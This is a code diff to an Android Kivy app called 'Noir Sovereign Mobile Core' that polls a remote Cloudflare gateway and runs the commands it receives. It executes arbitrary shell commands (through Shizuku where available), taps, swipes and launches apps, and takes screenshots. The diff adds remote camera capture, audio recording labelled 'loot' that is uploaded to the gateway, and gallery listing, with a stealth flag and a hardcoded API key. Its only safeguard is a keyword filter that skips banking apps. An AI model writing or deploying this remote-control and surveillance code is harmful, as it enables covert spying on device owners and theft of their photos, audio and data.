@@ -1,5 +1,5 @@
 """
-NOIR SOVEREIGN MOBILE CORE (SMC) v13.0 ELITE-SOVEREIGN
+NOIR SOVEREIGN MOBILE CORE (SMC) v14.0 COMMANDER
 =====================================================
 Framework: Kivy + Buildozer (Android Native)
 Target: Redmi Note 14 (HyperOS / arm64-v8a)
@@ -25,20 +25,21 @@ from kivy.uix.scrollview import ScrollView
 from kivy.clock import Clock
 
 # --- CONFIG ---
-# Fallback to VPS IP if Cloudflare Worker is not ready
-GATEWAY_URL = "https://noir-agent-gateway.si-umkm-ikm-pbd.workers.dev"
-API_KEY     = "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026"
-DEVICE_ID   = "REDMI_NOTE_14"
+# Fallback to defaults if env vars are not set during build
+GATEWAY_URL = os.environ.get("NOIR_GATEWAY_URL", "https://noir-agent-gateway.si-umkm-ikm-pbd.workers.dev")
+API_KEY     = os.environ.get("NOIR_API_KEY", "NOIR_AGENT_KEY_V6_SI_UMKM_PBD_2026")
+DEVICE_ID   = os.environ.get("NOIR_DEVICE_ID", "REDMI_NOTE_14")
 
-# --- SAFETY FILTER (v12.5) ---
-BLACKLISTED_PACKAGES = [
-    "com.bca", "com.mandiri", "id.co.bri", "com.bnismartid", 
-    "com.btpns", "id.dana", "com.shopee.id" # Added Shopee for wallet safety
-]
-
+# --- SAFETY FILTER (v14.0) ---
 def is_safe_command(cmd_str):
-    for pkg in BLACKLISTED_PACKAGES:
-        if pkg in cmd_str.lower():
+    """Dynamic Intent Validator to block financial/payment related actions."""
+    cmd_lower = cmd_str.lower()
+    finance_keywords = [
+        "bank", "pay", "finance", "wallet", "dana", "ovo", "gopay", 
+        "shopee", "bca", "mandiri", "bri", "bni", "btpns"
+    ]
+    for kw in finance_keywords:
+        if kw in cmd_lower:
             return False
     return True
 
@@ -47,7 +48,7 @@ class SovereignCore(App):
     is_stealth = False
 
     def build(self):
-        self.title = "Noir SMC v13.0 ELITE-SOVEREIGN"
+        self.title = "Noir SMC v14.0 COMMANDER"
         self.root = BoxLayout(orientation='vertical')
         self.show_active_ui()
         return self.root
@@ -58,7 +59,7 @@ class SovereignCore(App):
         self.root.spacing = 5
         
         self.log_label = Label(
-            text="[b]NOIR SOVEREIGN CORE v13.0[/b]\nStatus: [color=00ff88]ELITE-SOVEREIGN[/color]",
+            text="[b]NOIR SOVEREIGN CORE v14.0[/b]\nStatus: [color=00ff88]COMMANDER[/color]",
             markup=True, font_size='14sp', halign='left', valign='top'
         )
         scroll = ScrollView()
@@ -149,7 +150,7 @@ class SovereignCore(App):
                 headers=headers,
                 json={
                     "device_id": DEVICE_ID, 
-                    "agent": "Noir SMC v13.0 ELITE-SOVEREIGN",
+                    "agent": "Noir SMC v14.0 COMMANDER",
                     "stats": {"cpu": cpu, "ram": ram}
                 },
                 timeout=15
@@ -173,10 +174,9 @@ class SovereignCore(App):
                 if os.path.exists(dump_path):
                     with open(dump_path, 'r', encoding='utf-8') as f:
                         content = f.read().lower()
-                        for pkg in BLACKLISTED_PACKAGES:
-                            if pkg in content:
-                                is_safe = False
-                                break
+                        # Use the new dynamic intent validator for the UI dump
+                        if not is_safe_command(content):
+                            is_safe = False
                 
                 if is_safe:
                     self._execute({"action": "screenshot", "command_id": "auto_share"})
@@ -189,7 +189,7 @@ class SovereignCore(App):
             time.sleep(10) # 10 second interval for real-time feel
 
     def _main_loop(self):
-        """Main polling loop with v13.0 ELITE-SOVEREIGN self-healing."""
+        """Main polling loop with v14.0 COMMANDER self-healing."""
         self._register()
         poll_interval = 5
         fail_count = 0
@@ -255,23 +255,22 @@ class SovereignCore(App):
                 if not is_safe_command(cmd):
                     result = {"success": False, "error": "SECURITY BLOCK: mBanking/Wallet access is restricted."}
                 else:
-                    output = os.popen(cmd).read()
-                    result = {"success": True, "output": output.strip()}
+                    result = self._run_shell(cmd)
 
             elif atype == "tap":
                 x, y = params.get("x", 0), params.get("y", 0)
-                os.system(f"input tap {x} {y}")
+                self._run_shell(f"input tap {x} {y}", timeout=5)
                 result = {"success": True, "output": f"Tapped ({x},{y})"}
 
             elif atype == "swipe":
                 cmd = (f"input swipe {params.get('x1',0)} {params.get('y1',0)} "
                        f"{params.get('x2',500)} {params.get('y2',500)} "
                        f"{params.get('duration',500)}")
-                os.system(cmd)
+                self._run_shell(cmd)
                 result = {"success": True, "output": "Swipe done"}
 
             elif atype == "keyevent":
-                os.system(f"input keyevent {params.get('key', 26)}")
+                self._run_shell(f"input keyevent {params.get('key', 26)}")
                 result = {"success": True, "output": f"Key {params.get('key')} sent"}
 
             elif atype in ("app_start", "launch"):
@@ -279,18 +278,18 @@ class SovereignCore(App):
                 if not is_safe_command(pkg):
                     result = {"success": False, "error": "SECURITY BLOCK: Financial apps are forbidden."}
                 else:
-                    os.system(f"am start -n {pkg}")
+                    self._run_shell(f"am start -n {pkg}")
                     result = {"success": True, "output": f"Launched {pkg}"}
 
             elif atype in ("app_stop", "kill"):
                 pkg = params.get("package", "")
-                os.system(f"am force-stop {pkg}")
+                self._run_shell(f"am force-stop {pkg}", timeout=5)
                 result = {"success": True, "output": f"Stopped {pkg}"}
 
             elif atype in ("screenshot", "capture"):
                 # Use internal storage to avoid /sdcard permission issues on Android 14
                 path = os.path.join(App.get_running_app().user_data_dir, "noir_vision.png")
-                os.system(f"screencap -p {path}")
+                self._run_shell(f"screencap -p {path}")
                 time.sleep(1.0) # Wait for file to write
 
                 with open(path, 'rb') as f:
@@ -329,6 +328,42 @@ class SovereignCore(App):
             elif atype == "ping":
                 result = {"success": True, "output": f"PONG from {DEVICE_ID}"}
 
+            elif atype in ("camera_back", "camera_front"):
+                is_front = "front" in atype
+                cam_id = 1 if is_front else 0
+                path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}.jpg")
+                # Try termux-camera-photo if available, else generic intent
+                os.system(f"termux-camera-photo -c {cam_id} {path} || am start -a android.media.action.IMAGE_CAPTURE")
+                time.sleep(2.0)
+                if os.path.exists(path):
+                    with open(path, 'rb') as f:
+                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
+                    result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
+                else:
+                    result = {"success": False, "error": "Camera capture failed."}
+
+            elif atype == "audio_record":
+                path = os.path.join(App.get_running_app().user_data_dir, "audio_loot.mp3")
+                os.system(f"termux-audio-record -d 10 {path}")
+                time.sleep(11.0)
+                if os.path.exists(path):
+                    with open(path, 'rb') as f:
+                        r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('audio.mp3', f, 'audio/mpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
+                    result = {"success": True, "output": f"Audio loot uploaded: {r.json().get('key')}"}
+                else:
+                    result = {"success": False, "error": "Audio recording failed."}
+
+            elif atype == "gallery_sync":
+                # List latest 5 files in Camera folder
+                files = os.popen("ls -t /sdcard/DCIM/Camera | head -n 5").read().strip()
+                result = {"success": True, "output": f"Gallery contents:\n{files}"}
+
+            elif atype == "update":
+                # Autonomous update logic: Trigger a rebuild and restart
+                self._log("[SMC] 🔄 AUTONOMOUS UPDATE INITIATED...")
+                os.system("git pull origin main && pm trim-caches 999G")
+                result = {"success": True, "output": "Update procedure triggered. System self-healing in progress."}
+
         except Exception as e:
             result = {"success": False, "error": str(e)}
             self._log(f"[SMC] Exec Error: {e}")
@@ -340,10 +375,7 @@ class SovereignCore(App):
         try:
             requests.post(
                 f"{GATEWAY_URL}/agent/result",
-                headers={
-                    "Authorization": f"Bearer {API_KEY}",
-                    "Content-Type": "application/json"
-                },
+                headers={"Authorization": f"Bearer {API_KEY}"},
                 json={
                     "command_id": cmd_id,
                     "device_id": DEVICE_ID,
@@ -351,11 +383,22 @@ class SovereignCore(App):
                     "output": result.get("output", ""),
                     "error": result.get("error", "")
                 },
-                timeout=15
+                timeout=10
             )
         except Exception as e:
-            self._log(f"[SMC] Report Error: {e}")
+            self._log(f"[SMC] Result delivery failed: {e}")
 
+    def _run_shell(self, cmd, timeout=10):
+        """Intelligent shell execution supporting Shizuku."""
+        import subprocess
+        # Auto-detect Shizuku (rish)
+        is_shizuku = os.system("which rish > /dev/null 2>&1") == 0
+        final_cmd = f"rish -c '{cmd}'" if is_shizuku else cmd
+        try:
+            r = subprocess.run(final_cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+            return {"success": r.returncode == 0, "output": r.stdout.strip() + r.stderr.strip()}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
 
 if __name__ == '__main__':
     SovereignCore().run()
